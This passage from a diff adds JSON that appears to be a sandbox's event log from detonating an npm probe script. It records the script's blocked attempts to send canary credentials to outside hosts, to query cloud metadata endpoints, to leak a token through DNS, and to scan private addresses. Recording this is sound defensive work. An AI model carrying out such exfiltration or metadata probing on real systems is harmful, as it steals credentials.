+            "stage": "detonate",
+            "host": "78.141.205.99",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132223,
+          "id": 25,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 78.141.205.99",
+          "data": {
+            "stage": "detonate",
+            "host": "78.141.205.99",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.913224,
+          "id": 26,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach [2a05:f480:1000:95d:5400:7ff:fe00:80d0]; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "[2a05:f480:1000:95d:5400:7ff:fe00:80d0]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132254,
+          "id": 27,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+          "data": {
+            "stage": "detonate",
+            "host": "2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132276,
+          "id": 28,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 169.254.169.254; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "169.254.169.254",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132307,
+          "id": 30,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach metadata.google.internal; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "metadata.google.internal",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132318,
+          "id": 31,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 169.254.170.2; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "169.254.170.2",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.913233,
+          "id": 32,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 100.100.100.200; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "100.100.100.200",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132345,
+          "id": 33,
+          "containment": true
+        },
+        {
+          "kind": "egress_allowed",
+          "summary": "probe.js contacted allowlisted registry.npmjs.org",
+          "data": {
+            "stage": "detonate",
+            "host": "registry.npmjs.org",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.913236,
+          "id": 34,
+          "containment": false
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js sent canary credentials to allowlisted registry.npmjs.org in a request URL: it reached that host",
+          "data": {
+            "stage": "detonate",
+            "host": "registry.npmjs.org",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node",
+            "allowlisted": true
+          },
+          "ts": 1793926040.913238,
+          "id": 35,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h443.catch.darkflib.dev; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.catch.darkflib.dev",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132395,
+          "id": 36,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h80.catch.darkflib.dev; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.catch.darkflib.dev",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132416,
+          "id": 37,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach odd.catch.darkflib.dev:4444; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.catch.darkflib.dev:4444",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132435,
+          "id": 38,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to odd.catch.darkflib.dev:4444 in a request URL",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.catch.darkflib.dev:4444",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132454,
+          "id": 39,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 95.179.197.125; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "95.179.197.125",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132473,
+          "id": 40,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 95.179.197.125 in a request URL",
+          "data": {
+            "stage": "detonate",
+            "host": "95.179.197.125",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132488,
+          "id": 41,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach [2001:19f0:7400:219f:5400:7ff:fe03:9747]; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "[2001:19f0:7400:219f:5400:7ff:fe03:9747]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132504,
+          "id": 42,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to [2001:19f0:7400:219f:5400:7ff:fe03:9747] in a request URL",
+          "data": {
+            "stage": "detonate",
+            "host": "[2001:19f0:7400:219f:5400:7ff:fe03:9747]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132524,
+          "id": 43,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 2001:19f0:7400:219f:5400:7ff:fe03:9747",
+          "data": {
+            "stage": "detonate",
+            "host": "2001:19f0:7400:219f:5400:7ff:fe03:9747",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 555,
+            "source_kind": "node"
+          },
+          "ts": 1793926040.9132538,
+          "id": 44,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "node put the canary token in a DNS lookup of airlockcanaryf282471d111210d0.dns-res.invalid: answered by Airlock inside the VM, never left it",
+          "data": {
+            "stage": "detonate",
+            "pid": 555,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanaryf282471d111210d0.dns-res.invalid",
+            "via": "dns",
+            "payload": "airlockcanaryf282471d111210d0.dns-res.invalid"
+          },
+          "ts": 1793926040.9132612,
+          "id": 47,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node looked up airlockcanaryf282471d111210d0.dns-res.invalid; answered with sinkhole address 198.19.41.174",
+          "data": {
+            "stage": "detonate",
+            "pid": 555,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanaryf282471d111210d0.dns-res.invalid",
+            "via": "dns"
+          },
+          "ts": 1793926040.913263,
+          "id": 48,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "node put the canary token in a DNS lookup of airlockcanaryf282471d111210d0.res.catch.darkflib.dev: answered by Airlock inside the VM, never left it",
+          "data": {
+            "stage": "detonate",
+            "pid": 555,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanaryf282471d111210d0.res.catch.darkflib.dev",
+            "via": "dns",
+            "payload": "airlockcanaryf282471d111210d0.res.catch.darkflib.dev"
+          },
+          "ts": 1793926040.9132657,
+          "id": 49,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node looked up airlockcanaryf282471d111210d0.res.catch.darkflib.dev; answered with sinkhole address 198.19.41.100",
+          "data": {
+            "stage": "detonate",
+            "pid": 555,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "airlockcanaryf282471d111210d0.res.catch.darkflib.dev",
+            "via": "dns"
+          },
+          "ts": 1793926040.9132671,
+          "id": 50,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "10 outbound connection attempts refused by the egress policy (refused too fast to attribute to a process)",
+          "data": {
+            "stage": "detonate",
+            "count": 10,
+            "via": "tcp-counter",
+            "source_kind": "watch",
+            "ts_guest": 1793926039.726512
+          },
+          "ts": 1793926040.9132721,
+          "id": 52,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node tried to connect to raw IP 172.16.0.5:80; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": 555,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "172.16.0.5:80",
+            "via": "connect"
+          },
+          "ts": 1793926040.913274,
+          "id": 53,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node tried to connect to raw IP 192.168.1.1:80; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": 555,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "192.168.1.1:80",
+            "via": "connect"
+          },
+          "ts": 1793926040.9132779,
+          "id": 54,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "node tried to connect to raw IP 10.0.0.1:80; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": 555,
+            "cmd": "node probe.js",
+            "exe": "/usr/local/bin/node",
+            "source_kind": "watch",
+            "host": "10.0.0.1:80",
+            "via": "connect"
+          },
+          "ts": 1793926040.9132807,
+          "id": 55,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "a process tried to connect to raw IP [2001:19f0:7400:219f:5400:7ff:fe03:9747]:80; not allowlisted, refused by egress policy",
+          "data": {
+            "stage": "detonate",
+            "pid": null,
+            "cmd": "",
+            "exe": null,
+            "source_kind": "watch",
+            "host": "[2001:19f0:7400:219f:5400:7ff:fe03:9747]:80",
+            "via": "connect"
+          },
+          "ts": 1793926040.9132838,
+          "id": 56,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "2 outbound connection attempts refused by the egress policy (refused too fast to attribute to a process)",
+          "data": {
+            "stage": "detonate",
+            "count": 2,
+            "via": "tcp-counter",
+            "source_kind": "watch",
+            "ts_guest": 1793926039.7697282
+          },
+          "ts": 1793926040.9132867,
+          "id": 57,
+          "containment": true
+        }
+      ]
+    }
+  ]
+}
